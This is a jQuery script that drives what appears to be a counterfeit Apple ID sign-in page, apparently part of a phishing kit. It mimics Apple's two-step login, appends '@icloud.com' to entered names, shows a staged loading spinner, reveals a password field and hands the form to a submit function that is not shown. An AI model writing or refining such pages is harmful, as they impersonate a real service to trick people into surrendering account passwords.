 $(document).ready(function(){
     

    $("#btn_ip").css("top","5px");

    $("#cont_btn_apple").addClass("ap_bor");
    $("#cont_btn_apple").addClass("bor");
    
    $("#cont_pwd").addClass('no_visibless');
    $("#btn_ip").append('<img id="bt_flec2" class="icon icon_sign_in" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABoAAAAaCAYAAACpSkzOAAABgklEQVR42r3WsU7CUBSA4QtGQVIHYayjEgYTdpd2EV4BnXkGnWHRAY1jCZsJYtzcSU0kGt7ASSkLTD4ALvgPh4Q00GtL6/B1uSfnpO0991x1fGLrFHGBPiaYiQn6slbU5QlatPCKMa5QwQEyMFBCVda+JNYKUygLBx7OsAWlkZZYDw6yukJ5vOMZe1AhGXiQHPl1hXIY4g5pqIhSuJVcuVWFOniUQLWhlOTq+AtZ8GBAxcSAB2u50ADnIRPVsa+JqWGwKFSGF+G/dPGBQ81u9FBWPBq4hopQaI7voP6R3A3Fw0U1aiHxg/qauFO8KDlKTCifJp4CjDH3aa1ocBMTJedWBspngHkE9748O5j9W6G4P91N0KdzUUl6M8S1vW3N9m4uGna0QcMeaRp2hPLyj68lewQlf6ja/jHRRi/GMdFDO+nB11o7+EQBww1HeVdyFHSXk1048FD749ulJdaDg1zY69ab77plYluYqMjap8TaQdctnRIu4WKKHzGFK2slXZ5f2RlINtkg1cIAAAAASUVORK5CYII=">');
   
    $("#sign-in").on("click",function(){
      $("#carga_envio").css("display", "block");
      $("#bt_flec").css("display", "none");
      submitt();
    })


      $('#appleId').keyup(function(e) {
        if(e.keyCode == 13) {
             $("#btn_ip").addClass("disabled");
             $("#btn_ip").click();
             $("#btn_ip").removeAttr("onclick");
             // act_flecha();
        } 

    }); 
     
    if($("#appleId").val() != ""){
        var user = $("#appleId").val();
        $("#btn_ip").removeClass("disabled");
        $("#vl").val(0);
        $("#cant_input").val(user.length);
    }
       
  })



  function opc_felcha(){ 
    var opt = $("#vl").val();   
    $(".signin-error").addClass("ocult");
    if($("#appleId").val().length > 0){
        $("#btn_ip").css("opacity", "1");
        $("#btn_ip").removeClass("disabled");
    }else{
        $("#btn_ip").css("opacity", "0.3");
        $("#btn_ip").addClass("disabled"); 
    }      
    
    if(opt == 1){
        if($("#cant_input").val() != $("#appleId").val().length){ 
            $("#vl").val(0); 
            $("#cont_pwd").slideToggle(500,function(){
                $("#cont_btn_apple").addClass("ap_bor");
            });
            $("#sign-in").slideToggle(); 
            $("btn_ip").animate({opacity: '1'});
            $("#pwd").val('');
            $("#btn_ip").attr("onclick","veri_f()");
          } 
    }  
  }

  function act_flecha(){
    if($("#appleId").val().length > 0){ 
      if($("#appleId").val().indexOf("@") != -1){
      }else{
        $("#appleId").val($("#appleId").val() + "@icloud.com");
      }
    }   
  }

  function veri_f(){
   
    if($("#appleId").val().length > 0){ 
      $("#btn_ip").empty();
      var host = $("#dominio").val();
      $("#btn_ip").append('<img id="img_car" src="imagen/spinner2.gif" class="normal image" style="width:25px">');
 
      setTimeout(function() {
          $("#img_car").css("display","none");
          $("#btn_ip").empty(); 
          $("#btn_ip").css("opacity","0"); 
          $("#btn_ip").append('<img id="bt_flec2" class="icon icon_sign_in" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABoAAAAaCAYAAACpSkzOAAABgklEQVR42r3WsU7CUBSA4QtGQVIHYayjEgYTdpd2EV4BnXkGnWHRAY1jCZsJYtzcSU0kGt7ASSkLTD4ALvgPh4Q00GtL6/B1uSfnpO0991x1fGLrFHGBPiaYiQn6slbU5QlatPCKMa5QwQEyMFBCVda+JNYKUygLBx7OsAWlkZZYDw6yukJ5vOMZe1AhGXiQHPl1hXIY4g5pqIhSuJVcuVWFOniUQLWhlOTq+AtZ8GBAxcSAB2u50ADnIRPVsa+JqWGwKFSGF+G/dPGBQ81u9FBWPBq4hopQaI7voP6R3A3Fw0U1aiHxg/qauFO8KDlKTCifJp4CjDH3aa1ocBMTJedWBspngHkE9748O5j9W6G4P91N0KdzUUl6M8S1vW3N9m4uGna0QcMeaRp2hPLyj68lewQlf6ja/jHRRi/GMdFDO+nB11o7+EQBww1HeVdyFHSXk1048FD749ulJdaDg1zY69ab77plYluYqMjap8TaQdctnRIu4WKKHzGFK2slXZ5f2RlINtkg1cIAAAAASUVORK5CYII=">');
          btn_v_f(); 
          $("#cant_input").val($("#appleId").val().length);
          $("#vl").val(1);
      }, 1500);
    }  
  }

  
  function btn_v_f(){ 
       $("#cont_btn_apple").removeClass("ap_bor");
       $("#sign-in").css("top","50px");   
        $("#cont_pwd").slideToggle();
        $("#sign-in").slideToggle();
        setTimeout(function() {
            $("#pwd").focus(); 
            $("#pwd").select;
        }, 100);
  
  }